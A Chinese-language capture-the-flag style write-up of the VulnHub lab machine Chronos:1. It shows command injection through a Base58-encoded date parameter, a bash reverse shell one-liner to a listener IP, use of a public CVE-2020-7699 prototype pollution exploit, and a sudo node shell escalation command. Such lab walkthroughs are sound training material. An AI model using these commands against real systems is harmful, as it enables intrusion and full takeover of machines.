---
title: VulnHub Chronos：1
date: 2026-06-15 18:44:00
categories: 
  - VulnHub
tags:
  - RCE
  - express-fileupload 原型污染（CVE-2020-7699）
  - /etc/sudoers 配置不当
  - node 提权
---

# Chronos：1

项目地址：https://download.vulnhub.com/chronos/Chronos.ova

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a31561bb67c7e4f4a865e10.png)

## RCE

### date

查看 80 端口源代码发现有一个链接，地址是 `http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`

![](https://pic1.imgdb.cn/item/6a315e2ab67c7e4f4a86b6d6.png)

修改 hosts 文件访问，回显权限不够

![](https://pic1.imgdb.cn/item/6a3161b1b67c7e4f4a86b8bc.png)

将首页混淆的 JS 代码进行 AI 还原，看到需要设置 `User-Agent: Chronos`

![](https://pic1.imgdb.cn/item/6a316569b67c7e4f4a8703d7.png)

将请求参数进行解码得到 `'+Today is %A, %B %d, %Y %H:%M:%S.'`

![](https://pic1.imgdb.cn/item/6a3165b9b67c7e4f4a87041e.png)

根据回显扔给 AI 输出 `system("date '+$input'")` 后端命令

![](https://pic1.imgdb.cn/item/6a316800b67c7e4f4a8705fd.png)

使用 `;ls -l` 闭合掉，Base58 编码后发送

![](https://pic1.imgdb.cn/item/6a316840b67c7e4f4a87064c.png)

直接打反弹 Shell

```bash
bash -c 'bash -i >& /dev/tcp/192.168.125.4/8888 0>&1'
```

![](https://pic1.imgdb.cn/item/6a31695ab67c7e4f4a870787.png)

## 提权

### express-fileupload 原型污染（CVE-2020-7699）

在当前目录的上级目录 `/chronos-v2` 中发现运行在 8080 的服务源码

![](https://pic1.imgdb.cn/item/6a316a1db67c7e4f4a87084f.png)

扔给 AI 解析找到了存在的 CVE 编号

![](https://pic1.imgdb.cn/item/6a316bb6b67c7e4f4a8709d9.png)

下载漏洞利用文件传到靶机上

https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py

修改其中的参数

![](https://pic1.imgdb.cn/item/6a316dc3b67c7e4f4a870acf.png)

成功提权

![](https://pic1.imgdb.cn/item/6a316da4b67c7e4f4a870ac6.png)

### /etc/sudoers 配置不当

检查权限可以使用 Node 命令

![](https://pic1.imgdb.cn/item/6a316e01b67c7e4f4a870ae9.png)

### node 提权

```bash
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

- `node -e`: 让 Node.js 执行后面紧跟的字符串作为 JavaScript 代码

- `require("child_process")`：调用 Node.js 的 `child_process` 模块

- `spawn("/bin/sh", {stdio: [0, 1, 2]})`：启动一个新的 `/bin/sh` 进程。参数 `stdio: [0, 1, 2]` 让子进程的 stdin、stdout 和 stderr 与父进程保持一致

![](https://pic1.imgdb.cn/item/6a316ed5b67c7e4f4a870b57.png)